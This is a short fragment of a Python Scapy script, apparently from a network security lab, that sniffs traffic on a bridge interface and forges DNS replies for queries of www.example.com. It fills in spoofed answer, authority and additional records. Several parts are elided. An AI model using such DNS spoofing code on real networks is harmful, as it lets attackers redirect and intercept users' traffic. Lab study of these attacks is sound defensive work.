...
def spoof_dns(pkt):
	if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
		...
		qdcount=1, ancount=1, nscount=2, arcount=3, #added arcount=3
		an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2/Addsec3) #changed ns
...
pkt = sniff(iface='br-390cbbd34b08', filter=f, prn=spoof_dns)
